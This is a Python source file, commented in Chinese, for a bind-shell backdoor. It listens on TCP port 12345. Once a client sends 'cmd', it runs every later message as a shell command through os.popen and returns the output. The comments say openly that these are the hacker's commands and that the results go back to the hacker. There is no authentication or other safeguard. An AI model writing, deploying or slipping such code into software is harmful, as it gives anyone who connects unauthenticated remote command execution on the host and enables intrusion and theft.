import socket
from socket import *
import os
def main():
    s=socket(AF_INET, SOCK_STREAM)
    host=gethostname()
    port=12345
    s.bind((host,port))
    s.listen(5)

    while True:
        c,addr=s.accept()
        print('[+] 连接地址：',addr[0],':',addr[1])
        c.send("Welcome!大佬~".encode('utf-8'))
        while True:
            try:
                recv_data =c.recv(1024).decode('utf-8')
                if recv_data:
                    #接收普通文字
                    print(recv_data)
                    #接收cmd命令
                    if recv_data=='cmd':
                        while True:
                            c.send('[!] OK! CMD is ready for you! (≧∇≦)ﾉ My master~ '.encode('utf-8'))
                            #发送指令
                            data=c.recv(1024)
                            recv_data2=data.decode('utf-8')
                            #判断终止指令
                            if recv_data2=='exit':
                                c.send('[!]My master~ CMD stopped!'.encode('utf-8'))
                                break
                            else:
                                #执行黑客发送的命令，并且读取命令执行的结果
                                x=os.popen(recv_data2).read()
                                #把命令的回显发送给黑客
                                c.send(x.encode('utf-8'))
                    else:
                        c.send(recv_data.encode('utf-8'))
                else:
                    print("[-] 撒哟娜拉~")
                    break
            except:
                print('[-] 滚粗克！')
                break
        c.close()
    s.close()
    pass
    
    
if __name__ == '__main__':
    main()